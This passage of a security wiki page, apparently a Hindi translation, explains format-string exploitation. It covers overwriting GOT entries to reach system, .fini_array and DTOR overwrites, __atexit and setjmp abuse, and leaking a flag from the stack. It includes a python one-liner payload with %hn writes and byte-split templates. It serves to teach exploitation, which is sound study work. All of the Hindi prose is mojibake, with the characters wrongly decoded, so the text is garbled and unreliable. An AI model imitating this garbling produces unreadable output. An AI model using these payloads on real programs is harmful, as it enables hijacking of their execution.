GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ **рдбреАрдмрдЧрд┐рдВрдЧ** рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЧреЙрдЯ рддрд╛рд▓рд┐рдХрд╛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП **`got`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (621).png>)

рдПрдХ рдмрд╛рдЗрдирд░реА рдореЗрдВ GOT рдореЗрдВ рдлрдВрдХреНрд╢рдиреЛрдВ рдпрд╛ PLT рдЦрдВрдб рдХреЗ **рдкрддреЗ** рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдлрдВрдХреНрд╢рди рдкрддреЗ рдХреЛ рд▓реЛрдб рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реЛрдЧрд╛ рдХрд┐ рдПрдХ рдРрд╕реЗ рдлрдВрдХреНрд╢рди рдХреЗ **GOT рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬреЛ рдмрд╛рдж рдореЗрдВ **`system`** **рдлрдВрдХреНрд╢рди** рдХреЗ **PLT** рдХреЗ **рдкрддреЗ** рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдЖрдкрдХреА рдЖрд╢рд╛ рд╣реЛрдЧреА рдХрд┐ рдЖрдк рдПрдХ рдРрд╕реЗ **рдлрдВрдХреНрд╢рди** рдХреЗ **GOT** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕реЗ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдЗрд╕рд▓рд┐рдП рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдлрдВрдХреНрд╢рди рдХреЛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХреЗрдВрдЧреЗ)ред

рдпрджрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ **`system`** **рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдлрдВрдХреНрд╢рди **GOT рдореЗрдВ** рдПрдХ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ **рдирд╣реАрдВ** рд╣реЛрдЧреАред рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЖрдкрдХреЛ **рдкрд╣рд▓реЗ рд╕рд┐рд╕реНрдЯрдо рдлрдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛** рд╣реЛрдЧреАред

**Procedure Linkage Table** рдПрдХ **рдкрдардиреАрдп** рддрд╛рд▓рд┐рдХрд╛ рд╣реИ рдЬреЛ ELF рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ **рдкреНрд░рддреАрдХреЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд** рдХрд░рддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╕рдВрдХрд▓рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЬрдм рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдлрдВрдХреНрд╢рди рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **GOT** рдлреНрд▓реЛ рдХреЛ **PLT** рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдпрд╣ рдлрдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХреЗ рдФрд░ рдЗрд╕реЗ GOT рдкрд░ рд▓рд┐рдЦ рд╕рдХреЗред\
рдлрд┐рд░, рдЙрд╕ рдкрддреЗ рдкрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ рд╕реАрдзреЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк **`objdump -j .plt -d ./vuln_binary`** рдХреЗ рд╕рд╛рде PLT рдкрддреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ

### **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдлреНрд▓реЛ**

рдкрд╣рд▓реЗ рд╕реЗ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд▓рдХреНрд╖реНрдп рд╣реЛрдЧрд╛ рдХрд┐ рдмрд╛рдж рдореЗрдВ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ **рдлрдВрдХреНрд╢рди** рдХреЗ **GOT** рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ **рдкрддреЗ** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд┐рдпрд╛ рдЬрд╛рдПред рдЖрджрд░реНрд╢рд╡рд╛рджреА рд░реВрдк рд╕реЗ, рд╣рдо **рдПрдХ рд╢реИрд▓рдХреЛрдб рдХреЗ рдкрддреЗ** рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ executable рдЦрдВрдб рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ executable рдЦрдВрдб рдореЗрдВ рдПрдХ рд╢реИрд▓рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред\
рддреЛ рдПрдХ рдЕрд▓рдЧ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рдЖрдк рдПрдХ **рдлрдВрдХреНрд╢рди** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░реЗрдВ рдЬреЛ рдЕрдкрдиреЗ **рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕** рдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **`system`** **рдлрдВрдХреНрд╢рди** рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯ рдХрд░реЗрдВред

рдкрддреЗ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдорддреМрд░ рдкрд░ 2 рдХрджрдо рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: рдЖрдк **рдкрд╣рд▓реЗ 2 рдмрд╛рдЗрдЯ** рдХрд╛ рдкрддрд╛ рд▓рд┐рдЦрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рджреВрд╕рд░реЗ 2 рдХреЛред рдЗрд╕рдХреЗ рд▓рд┐рдП **`$hn`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

HOB рдкрддреЗ рдХреЗ 2 рдКрдЪреЗ рдмрд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ\
LOB рдкрддреЗ рдХреЗ 2 рдирд┐рдЪрд▓реЗ рдмрд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЗрд╕рд▓рд┐рдП, рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг рдЖрдкрдХреЛ **рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдЫреЛрдЯрд╛ рд▓рд┐рдЦрдирд╛** рд╣реЛрдЧрд╛ \[HOB, LOB] рдФрд░ рдлрд┐рд░ рджреВрд╕рд░рд╛ред

рдпрджрд┐ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

рдпрджрд┐ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N┬║Param\_dir\_HOB LOB\_shell-HOB\_shell N┬║Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ**

рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рдлреЙрд░реНрдореЗрдЯ-рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ GOT рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдПрдХ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреЙрд▓ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдлрдВрдХреНрд╢рди** рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рд░реЛрдЪрдХ рд╣реИ рдпрджрд┐ рдЖрдк рдПрдХ **рдкрддреЗ рдкрд░ рдЬрд╛рдХрд░ рдЕрдкрдиреЗ рд╢реИрд▓рдХреЛрдб рдХреЛ рдХреЙрд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдРрд╕реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ **рдПрдХ рдЕрдирдВрдд рд▓реВрдк рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдЖрдк рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрддреЗ рд╣реИрдВ, рдХреИрдирд╛рд░реА рдЗрд╕реЗ рджреЗрдЦреЗрдЧреА, рд╕реНрдЯреИрдХ рдХрд╛ рдЕрдВрдд рдХреНрд╖рддрд┐рдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдлрд┐рд░ рд╕реЗ рдмреБрд▓рд╛рдпрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ рд╡рд▓реНрди рдХрд╛ 1 рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛ рд╕рдХреЗрдЧрд╛ред

### **рдлрд╝реЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**

рдПрдХ рдлрд╝реЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдореЗрдореЛрд░реА рд╕реЗ **рд╕рд╛рдордЧреНрд░реА рдбрдВрдк** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рдПрдХ **рдлрд╝реНрд▓реИрдЧ рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реНрдерд╛рдирд┐рдХ рдЪрд░** рд╣реИред рдпрджрд┐ рдЖрдк **рдореЗрдореЛрд░реА** рдореЗрдВ **рдлрд╝реНрд▓реИрдЧ** рдХреЗ **рдкреЙрдЗрдВрдЯрд░** рдХрд╛ **рдкрддрд╛ рд▓рдЧрд╛ рд▓реЗрдВ**, рддреЛ рдЖрдк **printf** рдХреЛ рдЙрд╕ **рдкрддреЗ** рддрдХ **рдкрд╣реБрдВрдЪ** рдХрд░ **рдлрд╝реНрд▓реИрдЧ** рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ:

рдЗрд╕рд▓рд┐рдП, рдлрд╝реНрд▓реИрдЧ **0xffffcf4c** рдореЗрдВ рд╣реИ

![](<../../.gitbook/assets/image (618) (2).png>)

рдФрд░ рд▓реАрдХ рд╕реЗ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдлрд╝реНрд▓реИрдЧ рдХреЗ рдкреЙрдЗрдВрдЯрд░** рдХрд╛ **8рд╡рд╛рдВ** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╣реИ:

![](<../../.gitbook/assets/image (623).png>)

рдЗрд╕рд▓рд┐рдП, **8рд╡реЗрдВ рдкреИрд░рд╛рдореАрдЯрд░** рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЖрдк рдлрд╝реНрд▓реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (624).png>)

рдкрд┐рдЫрд▓реЗ рдЙрддреНрдкрд╛рджрди рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рддреЗ рд╣реБрдП рдФрд░ рд╕рдордЭрддреЗ рд╣реБрдП рдХрд┐ рдЖрдк **рд╕рд╛рдордЧреНрд░реА рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **рдкреЙрдЗрдВрдЯрд░** рдХреЛ **`printf`** рдХреЗ рдЙрд╕ рдЦрдВрдб рдореЗрдВ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓** рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдбрдВрдк** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

### **DTOR**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдПрдХ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдПрдХ dtor рдЦрдВрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

рдбрд┐рд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╡реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддреЗ рд╣реИрдВред
рдпрджрд┐ рдЖрдк **`__DTOR_END__`** рдореЗрдВ рдПрдХ **рд╢реЗрд▓рдХреЛрдб** рдХреЗ рд▓рд┐рдП **рдПрдХ рдкрддрд╛** рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╡рд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдЧрд╛ред
рдЗрд╕ рдЦрдВрдб рдХрд╛ рдкрддрд╛ рдЗрд╕рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep тАЬ__DTORтАЭ
```
рдЖрдорддреМрд░ рдкрд░ рдЖрдкрдХреЛ **DTOR** рдЦрдВрдб рдХреЛ **`ffffffff`** рдФрд░ **`00000000`** рдХреЗ рдордзреНрдп рдореЗрдВ рдкрд╛рдПрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдмрд╕ рдЙрди рдорд╛рдиреЛрдВ рдХреЛ рджреЗрдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреЛрдИ рднреА рдлрд╝рдВрдХреНрд╢рди рдкрдВрдЬреАрдХреГрдд рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **`00000000`** рдХреЗ рд╕рд╛рде **рдЕрдзрд┐рд░реЛрд╣рд┐рдд** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ **рд╢реЗрд▓рдХреЛрдб** рдХреЗ **рдкрддреЗ** рдХреЗ рд╕рд╛рде **рдЕрдзрд┐рд░реЛрд╣рд┐рдд** рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### **рдлрд╝реЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ**

**sprintf** рдПрдХ рдлрд╝реЙрд░реНрдореЗрдЯреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ **рдЪрд░** рдореЗрдВ **рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред** рдЗрд╕рд▓рд┐рдП, рдЖрдк рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ **рдлрд╝реЙрд░реНрдореЗрдЯрд┐рдВрдЧ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдмрдлрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ** рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рд╕рд╛рдордЧреНрд░реА рдХреЙрдкреА рдХреА рдЬрд╛рддреА рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб `%.44xAAAA` рдмрдлрд░ рдореЗрдВ **44B+"AAAA" рд▓рд┐рдЦреЗрдЧрд╛**, рдЬреЛ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред

### **\_\_atexit рд╕рдВрд░рдЪрдирд╛рдПрдБ**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдЕрдкрдирд╛рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм рд╣реИ**ред
{% endhint %}

**`atexit()`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред** рдпреЗ **рдлрд╝рдВрдХреНрд╢рди** **`exit()`** рдпрд╛ **рдореБрдЦреНрдп** рдХреЗ **рд╡рд╛рдкрд╕реА** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдкрд░ **рдЪрд▓рд╛рдП рдЬрд╛рдПрдВрдЧреЗ**ред\
рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдЗрди **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ** рдХреЗ **рдкрддреЗ** рдХреЛ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдХреЗ рд▓рд┐рдП рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХреЗ **рдирд┐рдпрдВрддреНрд░рдг** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдзрд┐рдХ рдХрдард┐рди рд╣реИред\
рд╡рд░реНрддрдорд╛рди рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ** рдХрдИ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рдкреАрдЫреЗ **рдЫрд┐рдкреЗ рд╣реБрдП** рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ рдЬрд┐рди рдкрддреЛрдВ рдХреЗ рд▓рд┐рдП рдпрд╣ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ, рд╡реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдХреЗ рдкрддреЗ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **XOR** рдФрд░ **рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдпрд╣ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ **рдХрдо рд╕реЗ рдХрдо x86** рдФрд░ **x64\_86** рдкрд░ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИред\
**рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрд╝рдВрдХреНрд╢рди** **`PTR_MANGLE`** рд╣реИред m68k, mips32, mips64, aarch64, arm, hppa рдЬреИрд╕реА **рдЕрдиреНрдп рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░** рдЗрд╕ **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **рдЕрдорд▓ рдореЗрдВ рдирд╣реАрдВ рд▓рд╛рддреА** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрд╕реЗ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рд╣реБрдЖ рд╡рд╣реА рд▓реМрдЯрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрди рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХреЛ рдЗрд╕ рд╡реЗрдХреНрдЯрд░ рд╕реЗ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **setjmp() рдФрд░ longjmp()**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдЕрдкрдирд╛рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм рд╣реИ**ред
{% endhint %}

**`setjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рд╕рд╣реЗрдЬрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ\
**`longjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рд╕рд╣реЗрдЬреЗ рдЧрдП рд╕рдВрджрд░реНрдн** рд╣реИрдВ: `EBX, ESI, EDI, ESP, EIP, EBP`\
рдпрд╣ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ EIP рдФрд░ ESP **`PTR_MANGLE`** рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреА рд╡рд░реНрддрдорд╛рди рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓рддрд╛ рд╡рд╛рд▓реА рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░реЗрдВ рд╡рд╣реА рд╣реИрдВред\
рдпреЗ рддреНрд░реБрдЯрд┐ рдирд┐рд╡рд╛рд░рдг рдпрд╛ рдЕрд╡рд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддреЗ рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдореИрдВрдиреЗ рдкрдврд╝рд╛ рд╣реИ рдХрд┐ рдЕрдиреНрдп рд░рдЬрд┐рд╕реНрдЯрд░ рд╕рдВрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, **рддреЛ рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ `call ebx`, `call esi` рдпрд╛ `call edi`** рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдирд┐рдпрдВрддреНрд░рдг рдкрд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ ESP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**C++ рдореЗрдВ VTable рдФрд░ VPTR**

